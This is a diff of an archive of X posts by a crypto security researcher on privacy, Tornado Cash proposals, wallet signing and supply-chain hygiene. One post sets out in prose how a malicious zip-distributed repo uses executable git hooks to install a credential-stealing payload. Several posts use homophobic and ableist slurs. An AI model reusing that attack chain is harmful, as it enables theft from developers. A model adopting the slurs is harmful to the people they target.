+> the try to set the governance address to a vanity address that https://t.co/0VbG4KO9Yc https://t.co/rny5WWdd8M
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HLqOfTQbMAAl7Re.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/HLqOkaUaAAAh8r-.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/HLqO_cea8AE4SWK.jpg — no alt text provided by author
+
+**Quoted post (full text):**
+
+    #### Quoted post — @1667462199600717824 — 2026-06-25 11:57 UTC (2026-06-25 12:57 WAT)
+    
+    - URL: https://x.com/1667462199600717824/status/2070114103968887007
+    - Metrics (at fetch): bookmark 7, impression 32184, like 55, quote 3, reply 8, retweet 11
+    
+    > 1/ A suspicious DAO proposal on Tornado Cash was created ~8hrs ago. Summoning @pcaversaccio (and everyone else curious) for an independent opinion!
+    >
+    > Details in the thread below👇 https://t.co/akCpfW4f6P
+    
+    **Media:**
+    - media `3_2070110977916338176` (details not returned by the API)
+    
+
+
+---
+
+## 2026-06-23 · Post · probably only 5 people in the world care but on 2 may the tornado cash proposal 66 was accepted (i.e
+
+
+Tags (automatic): Blockchain / L1-L2 / bridge
+
+
+### Post — @pcaversaccio — 2026-06-23 16:18 UTC (2026-06-23 17:18 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2069454937898308035
+- Metrics (at fetch): bookmark 40, impression 16251, like 128, quote 1, reply 10, retweet 9
+
+> probably only 5 people in the world care but on 2 may the tornado cash proposal 66 was accepted (i.e. on-chain executed), which means an update to the ui version (tornadocash[.]eth[.]limo and some other domains). today i finally found the time to carefully review the _two new https://t.co/L9N7A5Uil1 https://t.co/ma8jjl4K02
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HLgr4QBaAAAOyu4.jpg — no alt text provided by author
+
+**Quoted post (full text):**
+
+    #### Quoted post — @pcaversaccio — 2026-02-16 20:09 UTC (2026-02-16 21:09 WAT)
+    
+    - URL: https://x.com/pcaversaccio/status/2023489985077539196
+    - Metrics (at fetch): bookmark 32, impression 25631, like 121, quote 3, reply 16, retweet 13
+    
+    > so four days ago a new proposal for Tornado Cash was accepted, which means an update to the UI version (tornadocash[.]eth[.]limo and some other domains). I haven't seen anyone doing a dee-dive on the diff yet so I have spent several hours carefully reviewing the changes, including a detailed check of each dep update reflected in the new `yarn.lock` file. I documented my findings in a gist (see comment section). tbh I would greatly appreciate additional review from others as I can always miss something but based on my analysis so far, the changes appear legitimate & I have found _no evidence_ suggesting a supply chain attack, despite some concerns raised by some.
+    
+    **Media:**
+    - photo: https://pbs.twimg.com/media/HBTe2PKbQAA9iMO.jpg — no alt text provided by author
+    
+
+
+---
+
+## 2026-06-20 · Post · dude, so many people obsessing over fucking tx speed &amp; scale are the same people who deposit int
+
+
+### Post — @pcaversaccio — 2026-06-20 11:48 UTC (2026-06-20 12:48 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2068299847736979802
+- Metrics (at fetch): bookmark 5, impression 9552, like 190, quote 1, reply 22, retweet 14
+
+> dude, so many people obsessing over fucking tx speed &amp; scale are the same people who deposit into a cex, wait 30 mins for confirmations, and then wait another day or two to get money into their bank account. if fully shielded txs took 1-2 mins to be included, most users would
+
+
+---
+
+## 2026-06-18 · Post · ok guys, talk is cheap as you all know. let's move forward here; some very preliminary thoughts on h
+
+
+Tags (automatic): Memory corruption / native
+
+
+### Post — @pcaversaccio — 2026-06-18 09:19 UTC (2026-06-18 10:19 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2067537719153324436
+- Metrics (at fetch): bookmark 19, impression 6866, like 66, quote 1, reply 4, retweet 7
+
+> ok guys, talk is cheap as you all know. let's move forward here; some very preliminary thoughts on how such a browser can be designed (i'm _not_ a browser expert btw). please share your feedback in the https://t.co/Vsma2KA2gl thread: https://t.co/UCtKIcmrZ6 https://t.co/bENx8qr8W8 https://t.co/fvOU0dMNkr
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HLFeQKcbQAAfL6Q.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/HLFeRjgbYAA3H7Q.png — no alt text provided by author
+- photo: https://pbs.twimg.com/media/HLFeSvEb0AAwuV6.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/HLFeT8QbIAAf9Ff.jpg — no alt text provided by author
+
+**Quoted post (full text):**
+
+    #### Quoted post — @pcaversaccio — 2026-06-17 19:07 UTC (2026-06-17 20:07 WAT)
+    
+    - URL: https://x.com/pcaversaccio/status/2067323271436177600
+    - Metrics (at fetch): bookmark 97, impression 31669, like 315, quote 5, reply 39, retweet 36
+    
+    > you can fully destroy perfect onchain privacy by leaking metadata (IP, user-agent, timezone, language settings, etc.). using Tor for any onchain interaction is one way but it's very easy to also fingerprint you as Tor user. what Ethereum needs is its own browser that _natively_ https://t.co/4PQVdOjCL5
+    
+    **Quoted post (full text):**
+    
+        #### Quoted post — @2312333412 — 2026-06-17 17:36 UTC (2026-06-17 18:36 WAT)
+        
+        - URL: https://x.com/2312333412/status/2067300352785821764
+        - Metrics (at fetch): bookmark 191, impression 172769, like 2059, quote 33, reply 195, retweet 288
+        
+        > Ethereum is inspired by tools that keep the internet open under pressure.
+        >
+        > @torproject protects freedom online by routing traffic through distributed relays, reducing tracking, surveillance, and censorship. https://t.co/bEJKqE2Mwl
+        
+        **Media:**
+        - media `3_2067300148166729729` (details not returned by the API)
+        
+    
+
+
+---
+
+## 2026-06-17 · Post · you can fully destroy perfect onchain privacy by leaking metadata (IP, user-agent, timezone, languag
+
+
+Tags (automatic): Blockchain / L1-L2 / bridge, AI-assisted hunting
+
+
+### Post — @pcaversaccio — 2026-06-17 19:07 UTC (2026-06-17 20:07 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2067323271436177600
+- Metrics (at fetch): bookmark 97, impression 31669, like 315, quote 5, reply 39, retweet 36
+
+> you can fully destroy perfect onchain privacy by leaking metadata (IP, user-agent, timezone, language settings, etc.). using Tor for any onchain interaction is one way but it's very easy to also fingerprint you as Tor user. what Ethereum needs is its own browser that _natively_ https://t.co/4PQVdOjCL5
+
+**Quoted post (full text):**
+
+    #### Quoted post — @2312333412 — 2026-06-17 17:36 UTC (2026-06-17 18:36 WAT)
+    
+    - URL: https://x.com/2312333412/status/2067300352785821764
+    - Metrics (at fetch): bookmark 191, impression 172769, like 2059, quote 33, reply 195, retweet 288
+    
+    > Ethereum is inspired by tools that keep the internet open under pressure.
+    >
+    > @torproject protects freedom online by routing traffic through distributed relays, reducing tracking, surveillance, and censorship. https://t.co/bEJKqE2Mwl
+    
+    **Media:**
+    - media `3_2067300148166729729` (details not returned by the API)
+    
+
+
+---
+
+## 2026-06-16 · Post · since launching @SEAL_911 on 2 August 2023, we have:
+
+
+### Post — @pcaversaccio — 2026-06-16 17:05 UTC (2026-06-16 18:05 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2066930269505110038
+- Metrics (at fetch): bookmark 16, impression 22556, like 211, quote 4, reply 6, retweet 36
+
+> since launching @SEAL_911 on 2 August 2023, we have:
+> - handled over 4,000 tickets incident tickets
+> - coordinated over 250 war rooms
+> - helped rescue more than $200 million
+>
+> SEAL 911 is powered entirely by _volunteers_ and represents what a true public good can achieve. we're https://t.co/YyeZ7dCttR https://t.co/hk0eNp0r0U
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HK8zz34boAAJrFv.jpg — no alt text provided by author
+
+**Quoted post (full text):**
+
+    #### Quoted post — @1572000098917445633 — 2026-06-16 15:54 UTC (2026-06-16 16:54 WAT)
+    
+    - URL: https://x.com/1572000098917445633/status/2066912429561217132
+    - Metrics (at fetch): bookmark 7, impression 43357, like 112, quote 37, reply 18, retweet 32
+    
+    > We're excited to share Epoch 12: Octant is for everyone.
+    >
+    > Allocation window opens at 12:30 pm ET today (16 June) and will close at 11:30 pm ET on 30 June. You can allocate on: https://t.co/hF0sdi7eiI
+    >
+    > This epoch marks a few big changes.
+    >
+    > This is our first epoch introducing https://t.co/pfxiWCVH56
+    
+    **Media:**
+    - media `3_2066900969376321536` (details not returned by the API)
+    
+
+
+---
+
+## 2026-06-16 · Post · when i wrote the manifesto, i hoped it would spark others to build toward the principles it outlined
+
+
+### Post — @pcaversaccio — 2026-06-16 11:36 UTC (2026-06-16 12:36 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2066847284542013863
+- Metrics (at fetch): bookmark 8, impression 4054, like 47, quote 0, reply 3, retweet 7
+
+> when i wrote the manifesto, i hoped it would spark others to build toward the principles it outlined (but you really never know). seeing projects like Shutter take inspiration from it and turn those principles into action is incredibly encouraging https://t.co/l1rO6NSXEA
+
+**Quoted post (full text):**
+
+    #### Quoted post — @1372860578369314819 — 2026-06-16 10:52 UTC (2026-06-16 11:52 WAT)
+    
+    - URL: https://x.com/1372860578369314819/status/2066836322304790685
+    - Metrics (at fetch): bookmark 6, impression 5741, like 34, quote 3, reply 2, retweet 6
+    
+    > Given recent discussions around the EF and the need for long-term public goods funding, the time is right to share our proposal for a Shutter PEN
+    >
+    > Shutter PEN is a Perpetual Endowment Network with the mission to fund projects aligned with The Ethereum Cypherpunk Manifesto https://t.co/pvfAAWMoo0
+    
+    **Media:**
+    - media `3_2066836319821832192` (details not returned by the API)
+    
+
+
+---
+
+## 2026-06-15 · Post · what a faggot - "for the children" but wants to actually increase full online surveillance. the fact
+
+
+### Post — @pcaversaccio — 2026-06-15 08:34 UTC (2026-06-15 09:34 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2066439126631485722
+- Metrics (at fetch): bookmark 1, impression 4497, like 84, quote 0, reply 5, retweet 3
+
+> what a faggot - "for the children" but wants to actually increase full online surveillance. the fact that the gov is patronising parents to introduce new surveillance laws is just one of many small steps how we lose our online privacy. the UK citizens must fight back https://t.co/vSTFweCHLK
+
+**Quoted post (full text):**
+
+    #### Quoted post — @7587032 — 2026-06-15 07:18 UTC (2026-06-15 08:18 WAT)
+    
+    - URL: https://x.com/7587032/status/2066420074265661746
+    - Metrics (at fetch): bookmark 1838, impression 7112956, like 18487, quote 2133, reply 3384, retweet 4788
+    
+    > BREAKING: Prime Minister Sir Keir Starmer has announced a social media ban for under-16s.
+    >
+    > Live updates: https://t.co/Jxi67uC5Qk https://t.co/VnIFMyjAhs
+    
+    **Media:**
+    - media `13_2066419943403294720` (details not returned by the API)
+    
+
+
+---
+
+## 2026-06-12 · Post · trying to access google via my whonix vm since 20mins - there is so much wrong on the internet these
+
+
+### Post — @pcaversaccio — 2026-06-12 15:45 UTC (2026-06-12 16:45 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2065460473773129922
+- Metrics (at fetch): bookmark 0, impression 3501, like 39, quote 0, reply 4, retweet 2
+
+> trying to access google via my whonix vm since 20mins - there is so much wrong on the internet these days https://t.co/7l5kW0CJQG
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HKn8esIbMAA9ySO.jpg — no alt text provided by author
+
+
+---
+
+## 2026-06-12 · Post · for anyone defending siwe because it improves some ux: `permit` improved ux too. but it also trained
+
+
+### Post — @pcaversaccio — 2026-06-12 11:28 UTC (2026-06-12 12:28 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2065395809206624323
+- Metrics (at fetch): bookmark 3, impression 6189, like 31, quote 0, reply 7, retweet 3
+
+> for anyone defending siwe because it improves some ux: `permit` improved ux too. but it also trained users to blindly sign off-chain messages &amp; guess what it contributed to insane losses from phishing. solving a ux problem is easy; solving it w/o creating worse security problems https://t.co/aqMqBUJEGw
+
+**Quoted post (full text):**
+
+    #### Quoted post — @pcaversaccio — 2026-06-11 14:14 UTC (2026-06-11 15:14 WAT)
+    
+    - URL: https://x.com/pcaversaccio/status/2065075322920603769
+    - Metrics (at fetch): bookmark 24, impression 21210, like 227, quote 5, reply 33, retweet 26
+    
+    > sign-in with ethereum is actually a terrible idea because it trains people to sign messages all the time &amp; creates _signing fatigue_. what you actually want is the exact opposite. a sig should be considered _dangerous_ and treated as a _special event_. it should not be something
+    
+
+
+---
+
+## 2026-06-11 · Post · sign-in with ethereum is actually a terrible idea because it trains people to sign messages all the 
+
+
+### Post — @pcaversaccio — 2026-06-11 14:14 UTC (2026-06-11 15:14 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2065075322920603769
+- Metrics (at fetch): bookmark 24, impression 21210, like 227, quote 5, reply 33, retweet 26
+
+> sign-in with ethereum is actually a terrible idea because it trains people to sign messages all the time &amp; creates _signing fatigue_. what you actually want is the exact opposite. a sig should be considered _dangerous_ and treated as a _special event_. it should not be something
+
+
+---
+
+## 2026-06-06 · Post · .@getyoti just "admitted" they consider one of the world's most respected privacy-focused mobile OS 
+
+
+### Post — @pcaversaccio — 2026-06-06 10:41 UTC (2026-06-06 11:41 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2063209569174913233
+- Metrics (at fetch): bookmark 47, impression 16822, like 365, quote 9, reply 19, retweet 43
+
+> .@getyoti just "admitted" they consider one of the world's most respected privacy-focused mobile OS a red flag. listen you fucktards: flagging GrapheneOS users as "suspicious" isn't security expertise; it's some weird security theater clownshow. the world turns into an Orwellian https://t.co/22IKp6MP7y
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HKH8SIbaEAARskX.jpg — no alt text provided by author
+
+
+---
+
+## 2026-06-05 · Post · Next: Accidentally deleted your private repo/org.
+
+
+### Post — @pcaversaccio — 2026-06-05 19:41 UTC (2026-06-05 20:41 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2062983077865967857
+- Metrics (at fetch): bookmark 1, impression 2355, like 19, quote 0, reply 3, retweet 0
+
+> Next: Accidentally deleted your private repo/org.
+>
+> https://t.co/HWVXNZsKuO https://t.co/S4YqG4eyGV
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HKEwLTvXEAAi-HA.jpg — no alt text provided by author
 
 
 ---
@@ -108,7 +1567,7 @@ Tags (automatic): Memory corruption / native
 ### Post — @pcaversaccio — 2026-06-05 07:54 UTC (2026-06-05 08:54 WAT)
 
 - URL: https://x.com/pcaversaccio/status/2062805325120696456
-- Metrics (at fetch): bookmark 44, impression 32924, like 264, quote 9, reply 46, retweet 27
+- Metrics (at fetch): bookmark 44, impression 32926, like 264, quote 9, reply 46, retweet 27
 
 > for any bitcoin maxi shitting on zcash, let me remind you of the transaction (block 74638) that created 184,467,440,737.09551616 BTC due to an overflow bug. zcash has one of the best security &amp; cryptography people. what happened is some serious shit, there is no going back and [pic.x.com/H1sWw9Oudz]
 
@@ -138,7 +1597,15 @@ Tags (automatic): Memory corruption / native
 
 **Links in post:** http://zec.rocks:443, https://twitter.com/solidintel_x/status/2062104722257883350
 
-**Quoted post** 2062104722257883350: not readable via the API (deleted, private, or withheld).
+**Quoted post (full text):**
+
+    #### Quoted post — @1404421873169993730 — 2026-06-03 09:30 UTC (2026-06-03 10:30 WAT)
+    
+    - URL: https://x.com/1404421873169993730/status/2062104722257883350
+    - Metrics (at fetch): bookmark 35, impression 287130, like 595, quote 69, reply 84, retweet 43
+    
+    > INTEL: ZCASH NETWORK IS DOWN, NOT PRODUCED ANY BLOCK IN THE PAST 4 HOURS
+    
 
 
 ---
@@ -149,7 +1616,7 @@ Tags (automatic): Memory corruption / native
 ### Post — @pcaversaccio — 2026-06-01 21:55 UTC (2026-06-01 22:55 WAT)
 
 - URL: https://x.com/pcaversaccio/status/2061567394716528959
-- Metrics (at fetch): bookmark 32, impression 12065, like 154, quote 6, reply 16, retweet 12
+- Metrics (at fetch): bookmark 32, impression 12068, like 154, quote 6, reply 16, retweet 12
 
 > so circle unblocklisted zama 2hrs ago via tx `0x138894c10f7fe17fda87c5ff7799085a8cb3261d2c7c2491d6fe75d0abf814d7`. 8hrs ago zama upgraded the implementation contract for cUSDC via tx `0x468f9a1433f795da68b88d6adb33f7180e86937d3f3437ec001173c52e7f35f4` which adds _an [pic.x.com/IXK24zeAjc]
 
@@ -198,6 +1665,578 @@ Tags (automatic): Blockchain / L1-L2 / bridge
 
 ---
 
+## 2026-05-21 · Post · ethereum isn't a fucking company and you don't "fix" it by building a $1b command center with a boar
+
+
+### Post — @pcaversaccio — 2026-05-21 19:10 UTC (2026-05-21 20:10 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2057539422007226487
+- Metrics (at fetch): bookmark 30, impression 28956, like 664, quote 8, reply 39, retweet 92
+
+> ethereum isn't a fucking company and you don't "fix" it by building a $1b command center with a board &amp; a mandate to pump eth. the moment you route staking or fee revenue into a central org "aligned with price", you've built a capture machine and called it accountability. that's
+
+
+---
+
+## 2026-05-21 · Post · fml, the Safe UI gave me 3 captchas in under 1 min; it's basically _unusable_ for me using a VPN ; i
+
+
+### Post — @pcaversaccio — 2026-05-21 10:35 UTC (2026-05-21 11:35 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2057410022225707467
+- Metrics (at fetch): bookmark 7, impression 5710, like 119, quote 1, reply 15, retweet 6
+
+> fml, the Safe UI gave me 3 captchas in under 1 min; it's basically _unusable_ for me using a VPN ; i'm a Safe power user but this becomes a pure shitshow. why does everyone on the internet hate my fucking fuck traffic https://t.co/ji9hv4FSUK
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HI1iasCacAA7dFL.png — no alt text provided by author
+
+
+---
+
+## 2026-05-20 · Post · &gt; be me
+
+
+### Post — @pcaversaccio — 2026-05-20 12:19 UTC (2026-05-20 13:19 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2057073704513712238
+- Metrics (at fetch): bookmark 3, impression 4209, like 52, quote 1, reply 6, retweet 0
+
+> &gt; be me
+> &gt; open Qubes disposable VM
+> &gt; open `vi`
+> &gt; write code
+> &gt; `:wq`
+> &gt; destroy VM
+> &gt; go yell at people why they don't wanna listen
+
+
+---
+
+## 2026-05-18 · Post · if you ever need to verify a CoW TWAP Safe multisig transaction, i put together a short verification
+
+
+### Post — @pcaversaccio — 2026-05-18 19:00 UTC (2026-05-18 20:00 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2056449756621398335
+- Metrics (at fetch): bookmark 37, impression 9950, like 103, quote 1, reply 13, retweet 9
+
+> if you ever need to verify a CoW TWAP Safe multisig transaction, i put together a short verification guide: https://gist.github.com/pcaversaccio/e18a0400174b143b662dd36ea2555495
+>
+> sometimes i really wonder if i'm the only one verifying this shit in detail because i was not able to find any other verification guide that goes into this much depth.
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HIn6AwcbwAAPOJY.jpg — no alt text provided by author
+
+**Links in post:** https://gist.github.com/pcaversaccio/e18a0400174b143b662dd36ea2555495
+
+
+---
+
+## 2026-05-14 · Post · the _toy_ language Fe is the perfect example of ivory tower building. it's not only a misallocation 
+
+
+Tags (automatic): Smart contract / DeFi
+
+
+### Post — @pcaversaccio — 2026-05-14 10:00 UTC (2026-05-14 11:00 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2054864393624498443
+- Metrics (at fetch): bookmark 7, impression 10364, like 133, quote 1, reply 8, retweet 12
+
+> the _toy_ language Fe is the perfect example of ivory tower building. it's not only a misallocation of funds but a complete lack of vision for what actually matters in the real world. Vyper is the uncapturable, formally verified, cypherpunkish surviving smart contract language this space actually needs. not a circle-jerked theoretical language that still hasn't been prod ready after years. if you're bullish on Ethereum, you _must_ fund Vyper, there is no other choice.
+
+
+---
+
+## 2026-05-13 · Post · i have updated all of my actively maintained repos that use npm packages in some form to only instal
+
+
+### Post — @pcaversaccio — 2026-05-13 13:02 UTC (2026-05-13 14:02 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2054547817650368918
+- Metrics (at fetch): bookmark 35, impression 11143, like 130, quote 4, reply 11, retweet 15
+
+> i have updated all of my actively maintained repos that use npm packages in some form to only install package versions that have been published for _at least 7 days_ (this includes transitive deps as well); 7 days is currently my hope that will be enough to catch the some-dev-account-got-compromised-and-published-something-malicious as well as the more sophisticated worm hacks. anyone who currently does not enforce a min release age for deps of at least 3 days imho is simply irresponsible.
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HIM2MtaaIAE3KbY.jpg — no alt text provided by author
+
+
+---
+
+## 2026-05-12 · Post · so our DPRK Contagious Interview friends have advanced in the meantime and now have started reking p
+
+
+### Post — @pcaversaccio — 2026-05-12 10:43 UTC (2026-05-12 11:43 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2054150512635953505
+- Metrics (at fetch): bookmark 52, impression 15317, like 140, quote 9, reply 12, retweet 24
+
+> so our DPRK Contagious Interview friends have advanced in the meantime and now have started reking people for which you only need to _unzip_ a file and run a git checkout or commit operation.
+>
+> so this how the attack works:
+> 1. the attacker distributes the repo as a zip archive (which is pivotal!). this is on purpose because git clone explicitly strips hooks (since cloning goes through git's _own_ protocol which excludes them) from remote sources as a security measure but unzipping is just a _normal_ filesystem ops that git cannot control (yeah fml but also simple fact). the zip restores file permissions exactly as the attacker set them (expect `rwxrwxr-x`), so the two active hooks (`pre-commit` & `post-checkout`) arrive on disk already executable (yeah fml).
+>
+> 2. git _automatically_ runs a hook when two conditions are met at the same time. the file must have the correct bare name with no `.sample` extension _and_ the executable bit must be set (like `rwxrwxr-x`). both of these are already satisfied by the attacker _before_ the zip is distributed. no fucking user action, config change, or approval is needed, git's own hook dispatch system triggers everything lmfaooo. software is great innit?
+>
+> 3. some of the custom `.sample` files in the shipped `.git/hooks` directory are the malicious payloads. they are basically payload components _disguised_ under innocent names. once the victim does anything beyond passively inspecting the repo (e.g. git checkout or git commit), the _active_ hook copies those files into `~/.vscode` (a directory devs usually trust and ignore but well you should not trust it guys) and then starts a detached background process using `nohup` so it does not block or visibly affect the git command. the git operation still completes normally and nothing looks suspicious. fucking evil, but hey here we are!
+>
+> 4. now that background process then bootstraps a node.js runtime if it is not already installed, runs npm install using an attacker controlled package.json, and executes an obfuscated payload (this can ofc differ and change over time). from that point the attacker gains clipboard access, a persistent c2 channel over http://socket.io (usually) and the ability to read browser credential dbs
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HIHMG_FaoAA4GOw.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/HIHNJwAaoAArAFD.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/HIHNNTHagAAzNJr.jpg — no alt text provided by author
+
+**Links in post:** http://socket.io
+
+
+---
+
+## 2026-05-09 · Post · ethereum got flooded by fucking mercenaries pretending to be revolutionaries. everyone talks about d
+
+
+### Post — @pcaversaccio — 2026-05-09 17:34 UTC (2026-05-09 18:34 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2053166634055995500
+- Metrics (at fetch): bookmark 50, impression 23705, like 529, quote 10, reply 43, retweet 75
+
+> ethereum got flooded by fucking mercenaries pretending to be revolutionaries. everyone talks about decentralisation until there's money on the table, then suddenly compliance, surveillance, business opportunities, and extraction become pragmatic. most of this ecosystem does not give a shit about freedom. they care about pumps, fees, and turning users into fucking exit liquidity. cypherpunk was never about making founders rich. it was about making tyranny obsolete. the grifters will cash out. the cowards will comply. cypherpunks will outlast all of them. principles compound harder than capital. you don't have to believe me. you won't. because you'll be gone while i'm still here.
+
+
+---
+
+## 2026-05-05 · Post · &gt;Non technical teams are now shipping production code
+
+
+### Post — @pcaversaccio — 2026-05-05 12:28 UTC (2026-05-05 13:28 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2051640254474391980
+- Metrics (at fetch): bookmark 16, impression 24311, like 474, quote 5, reply 19, retweet 11
+
+> &gt;Non technical teams are now shipping production code
+>
+> looking forward to all the upcoming data leaks that put each Coinbase user at risk.
+>
+> oh and btw Brian, did you coin your amazing content here on Base already?? https://twitter.com/brian_armstrong/status/2051616759145185723
+
+**Links in post:** https://twitter.com/brian_armstrong/status/2051616759145185723
+
+**Quoted post (full text):**
+
+    #### Quoted post — @14379660 — 2026-05-05 10:55 UTC (2026-05-05 11:55 WAT)
+    
+    - URL: https://x.com/14379660/status/2051616759145185723
+    - Metrics (at fetch): bookmark 11785, impression 23733965, like 19697, quote 4553, reply 5090, retweet 2334
+    
+    > This is an email I sent earlier today to all employees at Coinbase:
+    >
+    > Team,
+    >
+    > Today I’ve made the difficult decision to reduce the size of Coinbase by ~14%. I want to walk you through why we're doing this now, what it means for those affected, and how this positions us for the future.
+    >
+    > Why now
+    > Two forces are converging at the same time. We need to be front footed to respond to both.
+    >
+    > First, the market. Coinbase is well-capitalized, has diversified revenue streams, and is well-positioned to weather any storm. Crypto is also on the verge of the next wave of adoption, with stablecoins, prediction markets, tokenization, and more taking off. However, our business is still volatile from quarter to quarter. While we've managed through that cyclicality many times before and come out stronger on the other side, we’re currently in a down market and need to adjust our cost structure now so that we emerge from this period leaner, faster, and more efficient for our next phase of growth.
+    >
+    > Second, AI is changing how we work. Over the past year, I’ve watched engineers use AI to ship in days what used to take a team weeks. Non-technical teams are now shipping production code and many of our workflows are being automated. The pace of what's possible with a small, focused team has changed dramatically, and it's accelerating every day.
+    >
+    > All of this has led us to an inflection point, not just for Coinbase, but for every company. The biggest risk now is not taking action. We are adjusting early and deliberately to rebuild Coinbase to be lean, fast, and AI-native. We need to return to the speed and focus of our startup founding, with AI at our core.
+    >
+    > What this means
+    > To get there, we are not just reducing headcount and cutting costs, we’re fundamentally changing how we operate: rebuilding Coinbase as an intelligence, with humans around the edge aligning it. What does this mean in practice?
+    >
+    > - Fewer layers, faster decisions: We are flattening our org structure to 5 layers max below CEO/COO. Layers slow things down and create coordination tax. The future is small, high context teams that can move quickly. Leaders will own much more, with as many as 15+ direct reports. Fewer layers also means a leaner cost structure that is built to perform through all market cycles.
+    >
+    > - No pure managers: Every leader at Coinbase must also be a strong and active individual contributor. Managers should be like player-coaches, getting their hands dirty alongside their teams.
+    >
+    > - AI-native pods: We’ll be concentrating around AI-native talent who can manage fleets of agents to drive outsized impact. We’ll also be experimenting with reduced pod sizes, including “one person teams” with engineers, designers, and product managers all in one role.
+    >
+    > In short: AI is bringing a profound shift in how companies operate, and we’re reshaping Coinbase to lead in this new era. This is a new way of working, and we need to leverage AI across every facet of our jobs.
+    >
+    > To those who are affected
+    > I know there are real people behind these decisions — talented colleagues who have poured themselves into this company and our mission. To those of you who will be leaving: thank you. You’ve helped build Coinbase into what it is today, and I am sincerely grateful for everything you've done.
+    >
+    > All impacted team members will receive an email to their personal account in the next hour with more information, and an invitation to meet with an HRBP and a senior leader in your organization. Coinbase system access has been removed today. I know this feels sudden and harsh, but it is the only responsible choice given our duty to protect customer information.
+    >
+    > To those affected, we will be providing a comprehensive package to support you through this transition. US employees will receive a minimum of 16 weeks base pay (plus 2 weeks per year worked), their next equity vest, and 6 months of COBRA. Employees on a work visa will get extra transition support. Those outside of the US will receive similar support, based on local factors and subject to any consultation requirements.
+    >
+    > Coinbase prides itself on talent density. Our employees are among the most talented people in the world, and I have no doubt that your skills and experience will be highly sought after as you pursue your next chapters.
+    >
+    > How we move forward
+    > To the team that is staying, I know this is a difficult day. We’re saying goodbye to colleagues and friends you've been in the trenches with. But here’s what I want you to know as we move forward together:
+    >
+    > Over the past 13 years, we have weathered four crypto winters, gone public, and built the most trusted platform in our industry. We’ve made it this far by making hard decisions and by always staying focused on our mission. This time will be no different – nothing has changed about the long term outlook of our company or industry. And most importantly, our mission has never been more important for the world. Increasing economic freedom requires a new financial system, and we’re building it.
+    >
+    > The Coinbase that emerges from this will be more capable than ever to achieve our mission.
+    >
+    > Brian
+    
+
+
+---
+
+## 2026-05-01 · Post · putting pks into a pw manager is an insane thing to do and you should absolutely fucking not do this
+
+
+### Post — @pcaversaccio — 2026-05-01 08:39 UTC (2026-05-01 09:39 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2050133103881167305
+- Metrics (at fetch): bookmark 23, impression 16523, like 115, quote 4, reply 14, retweet 12
+
+> putting pks into a pw manager is an insane thing to do and you should absolutely fucking not do this (you would be surprised how many projects do this still fml), but i have been yelling into the void (for now) that pw managers should stop offering this retarded and completely unnecessary risky feature; i mean i do like proton for example (to be clear, proton is unrelated to the incident i qt), but this is all non-sense, they give people "bad ideas" here. this is a perfect example where additional friction should be added to a product; eg the pw manager should be able to detect if a certain pk or seed phrase is pasted and generally disallow this. https://x.com/pcaversaccio/status/1940460449062936948
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HHOHaLAaMAA6wwF.png — no alt text provided by author
+
+**Links in post:** https://twitter.com/syndicateio/status/2049866085542089083, https://x.com/pcaversaccio/status/1940460449062936948
+
+**Quoted post (full text):**
+
+    #### Quoted post — @1298091402975354880 — 2026-04-30 14:58 UTC (2026-04-30 15:58 WAT)
+    
+    - URL: https://x.com/1298091402975354880/status/2049866085542089083
+    - Metrics (at fetch): bookmark 53, impression 198690, like 128, quote 73, reply 33, retweet 14
+    
+    > The root cause was a private key compromise. Keys were stored in a password manager accessible to a small number of people to handle chain maintenance and upgrades, without an additional encryption layer separate from the password manager.
+    
+
+
+---
+
+## 2026-04-28 · Post · rant time: people are so fucking obsessed with building more tools, more products, more services, mo
+
+
+Tags (automatic): Dependency confusion / supply chain
+
+
+### Post — @pcaversaccio — 2026-04-28 12:26 UTC (2026-04-28 13:26 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2049102934085161140
+- Metrics (at fetch): bookmark 26, impression 13334, like 253, quote 2, reply 34, retweet 28
+
+> rant time: people are so fucking obsessed with building more tools, more products, more services, more "security" layers. are you guys all fucking insane?? every single thing you add is more complexity. and complexity is exactly what makes systems _dangerous_. you don't get safer by stacking abstractions on top of abstractions. you just increase the attack surface and pray the whole dependency chain doesn't collapse (hint: it will collapse!!). now you depend on 10, 50, 100 moving parts. all needing updates, all with their own bugs, all potential supply chain failures and we call that "security" like fucking retards.
+>
